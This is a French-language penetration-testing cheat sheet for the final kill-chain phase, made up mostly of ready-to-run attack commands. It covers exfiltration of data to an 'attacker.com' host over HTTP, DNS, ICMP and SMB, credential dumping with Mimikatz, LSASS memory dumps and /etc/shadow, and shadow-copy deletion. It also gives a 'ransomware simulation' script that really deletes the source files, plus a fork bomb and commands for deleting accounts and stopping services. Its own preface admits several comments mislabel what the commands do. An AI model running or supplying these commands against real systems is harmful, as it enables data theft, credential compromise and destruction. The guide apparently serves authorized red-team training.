# 🎯 Phase 7: Actions sur les objectifs

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Objectif :** Atteindre l’objectif final : exfiltration de données, destruction ou autre impact.

> **Précisions sur les exemples :** la commande annoncée « Base64 par GET » utilise `curl -d`, donc un corps de requête POST par défaut. Le trafic HTTP n’est pas chiffré ; HTTPS l’est. `net user administrator ...` modifie uniquement le compte nommé, contrairement au commentaire « tous les mots de passe ». Le redimensionnement du stockage des clichés n’équivaut pas à désactiver ce mécanisme. Le code présenté comme une simulation de chiffrement supprime réellement les fichiers sources ; il ne s’agit pas d’une simulation sans effet. Les commandes sont reproduites telles quelles, sans exécution.

---

## 📤 Exfiltration de données

### Recherche de données sensibles

#### Windows
```cmd
# Rechercher des fichiers sensibles
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Rechercher des fichiers récemment modifiés
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell — recherche dans le contenu
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Rechercher des fichiers sensibles
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Fichiers récents
find / -mtime -7 -type f 2>/dev/null

# Fichiers volumineux
find / -size +100M -type f 2>/dev/null
```

### Compresser et préparer les données

#### Windows
```powershell
# PowerShell — créer une archive ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar avec compression
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Créer une archive compressée
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Avec chiffrement
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP protégé par mot de passe
zip -r -e data.zip /sensitive/
```

### Méthodes d’exfiltration

#### HTTP/HTTPS
```bash
# Téléverser avec curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 par GET (petit volume de données)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Téléversement avec PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### Exfiltration par DNS
```bash
# Encoder les données dans des requêtes DNS
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Avec dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Exfiltration par ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Avec icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Copier vers le partage de la machine d’attaque
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Monter et copier (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Services cloud
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Actions destructrices (simulation de rançongiciel)

> ⚠️ **AVERTISSEMENT :** Uniquement dans le cadre de missions red team autorisées !

### Simulation de chiffrement
```powershell
# PowerShell — chiffrer les fichiers (simulation)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Suppression des clichés instantanés de volume
```cmd
# Supprimer les clichés instantanés (empêche leur utilisation pour la restauration)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Désactiver les clichés instantanés
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Collecte d’identifiants

### Identifiants Windows
```powershell
# Mimikatz — tous les identifiants
mimikatz# sekurlsa::logonpasswords

# Extraire la base SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# Capture mémoire de LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Extraire depuis la capture mémoire
pypykatz lsa minidump lsass.dmp
```

### Identifiants Linux
```bash
# Fichier shadow
cat /etc/shadow

# Clés SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Fichiers d’historique
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Fichiers de configuration
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Identifiants des navigateurs
```bash
# Identifiants Chrome (Windows)
# Emplacement : %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Identifiants Firefox (Windows)
# Emplacement : %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne — tous les mots de passe des navigateurs
python laZagne.py all
```

---

## 🖥️ Impact sur le système

### Déni de service
```bash
# Fork bomb (Linux) — NE PAS EXÉCUTER !
:(){ :|:& };:

# Remplir le disque
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Épuisement des ressources processeur
yes > /dev/null &
```

### Manipulation des comptes
```bash
# Changer tous les mots de passe utilisateurs
net user administrator NewP@ssw0rd!

# Désactiver les comptes
net user username /active:no

# Supprimer des utilisateurs
net user username /delete
```

### Interruption de services
```cmd
# Arrêter des services critiques
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Désactiver des services
sc config wuauserv start= disabled
```

---

## 📊 Aide-mémoire

### Méthodes d’exfiltration

| Méthode | Avantages | Inconvénients |
|--------|------|------|
| HTTP/HTTPS | Trafic courant, chiffré | Peut être surveillé |
| DNS | Souvent non surveillé | Lent, limites de taille |
| ICMP | Peut franchir certains pare-feu | Très lent |
| SMB | Rapide, natif | Interne uniquement |
| Cloud | Services légitimes | Nécessite des identifiants |

### Priorités des emplacements de données

| Emplacement | Valeur |
|----------|-------|
| Contrôleur de domaine | Priorité maximale — identifiants AD |
| Serveurs de fichiers | Priorité élevée — documents |
| Serveurs de messagerie | Priorité élevée — communications |
| Serveurs de bases de données | Priorité élevée — données métier |
| Serveurs de développement | Priorité moyenne — code source |
| Postes utilisateurs | Priorité moyenne — fichiers locaux |

---

## ✅ Liste de vérification du rapport de test d’intrusion

```markdown
- [ ] Documenter tous les systèmes compromis
- [ ] Lister tous les identifiants découverts
- [ ] Retracer le chemin d’attaque depuis l’accès initial
- [ ] Documenter les vulnérabilités exploitées
- [ ] Indiquer les emplacements de données sensibles découverts
- [ ] Fournir des recommandations de remédiation
- [ ] Inclure une chronologie des activités
- [ ] Joindre des captures d’écran prouvant l’accès
```

---

## 🔗 Fiches associées

- [Mimikatz](../../Mimikatz/README.md)
- [Commandes Linux](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**Phase précédente :** [← 06 - Évasion des défenses](./06-Defense-Evasion.fr.md)

**Retour à la vue d’ensemble :** [🎯 Vue d’ensemble de la Kill Chain](./README.fr.md)

---

<p align="center">
  <b>🎯 Mission terminée !</b><br>
  <i>Rappel : ces actions exigent une autorisation appropriée !</i>
</p>
